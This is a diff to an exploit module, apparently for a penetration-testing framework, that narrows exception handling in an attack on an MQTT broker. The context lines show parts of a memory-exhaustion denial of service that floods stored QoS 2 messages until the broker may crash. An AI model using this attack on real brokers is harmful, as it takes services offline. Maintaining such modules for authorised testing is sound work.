@@ -96,7 +96,7 @@ class Exploit(Exploit):
             s.close()
             # CONNACK: 0x20 0x02 0x00 0x00
             return resp and resp[0] == 0x20
-        except Exception:
+        except (ConnectionError, TimeoutError, OSError):
             return False
 
     def run(self):
@@ -148,7 +148,7 @@ class Exploit(Exploit):
                     s.settimeout(0.1)
                     s.recv(8)  # drain PUBREC
                     s.settimeout(None)
-                except Exception:
+                except OSError:
                     pass
 
             print_success(f"[GHSA-5jvp-3p2v-5qgf] Sent {self.packets} QoS 2 packets (~{self.packets * self.payload_kb}KB stored in broker)")
@@ -157,7 +157,7 @@ class Exploit(Exploit):
             s.close()
         except ConnectionResetError:
             print_success("[GHSA-5jvp-3p2v-5qgf] Connection reset - broker may have crashed (OOM)!")
-        except Exception as e:
+        except (ConnectionError, TimeoutError, OSError) as e:
             print_error(f"[GHSA-5jvp-3p2v-5qgf] {e}")
 
 
